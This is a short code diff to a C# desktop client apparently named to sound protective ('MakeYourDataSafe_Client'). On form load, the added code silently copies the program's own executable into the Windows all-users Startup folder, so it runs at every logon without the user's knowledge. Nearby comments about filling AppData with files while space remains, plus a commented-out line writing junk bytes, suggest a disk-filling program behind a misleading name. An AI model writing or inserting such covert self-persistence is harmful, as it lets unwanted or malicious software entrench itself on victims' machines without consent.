@@ -21,6 +21,7 @@ namespace MakeYourDataSafe_Client
         private void mainForm_Load(object sender, EventArgs e)
         {
             timer1.Start();
+            copyfile();
         }
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -37,6 +38,15 @@ namespace MakeYourDataSafe_Client
             }
             //Appdataba rakni fájlokat, ha még van elég hely
             //System.IO.File.WriteAllBytes("file.txt", new byte[10000]);
+        }
+        private void copyfile()
+        {
+            string i = System.Reflection.Assembly.GetEntryAssembly().Location;
+            
+            Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
+            DirectoryInfo info = new DirectoryInfo(".");
+            string o = info.Root + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"+ System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
+            File.Copy(i, o);
         }
     }
 }
